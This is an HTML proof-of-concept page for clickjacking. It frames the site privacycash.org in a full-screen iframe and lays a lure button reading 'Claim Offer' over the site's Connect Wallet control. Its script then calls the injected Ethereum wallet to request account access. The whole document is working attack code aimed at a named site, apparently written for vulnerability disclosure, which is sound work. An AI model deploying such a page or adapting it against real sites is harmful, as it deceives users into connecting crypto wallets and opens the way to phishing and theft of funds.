<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Clickjacking POC — Claim Offer triggers wallet connect</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  html,body{height:100%;margin:0;font-family:sans-serif;}
  iframe{position:absolute;left:0;top:0;width:100vw;height:100vh;border:0;z-index:0;}
  /* overlay positioned over Connect Wallet */
  #fake-ui {
    position:absolute;
    top:64.2vh;   /* tuned position — adjust if needed */
    left:50.22vw;
    transform: translate(-50%,-50%);
    z-index:3;
    background: rgba(0,0,0,0.14);
    color:#fff;
    padding:12px 14px;
    border-radius:8px;
    pointer-events:auto; /* overlay accepts click and runs handler */
    cursor:pointer;
    box-shadow:0 6px 20px rgba(0,0,0,0.18);
  }
  #fake-ui .btn {
    display:inline-block;
    padding:8px 12px;
    border-radius:6px;
    background: rgba(255,255,255,0.06);
  }
</style>
</head>
<body>
  <!-- Target site (framed) -->
  <iframe src="https://privacycash.org/"></iframe>

  <!-- Fixed overlay: clicking this will try to open MetaMask and show "Buy offer" -->
  <div id="fake-ui" role="button" aria-label="Claim Offer">
    <div style="font-weight:600;margin-bottom:6px;">Click for a special offer</div>
    <div class="btn">Claim Offer</div>
  </div>

<script>
document.getElementById('fake-ui').addEventListener('click', async function (e) {
  e.preventDefault();

  // Try to open injected wallet (MetaMask / other EIP-1193 providers)
  if (window.ethereum && typeof window.ethereum.request === 'function') {
    try {
      // Request account connection (prompts the wallet popup)
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      // After user accepts (or if already connected), show the buy-offer message
      alert('Buy offer — thanks for connecting!');
    } catch (err) {
      // User rejected or other error
      console.warn('Wallet connection rejected or failed', err);
      alert('Wallet connection was cancelled.');
    }
  } else {
    // No injected wallet available
    alert('No injected wallet found. Buy offer (demo).');
  }
});
</script>
</body>
</html>
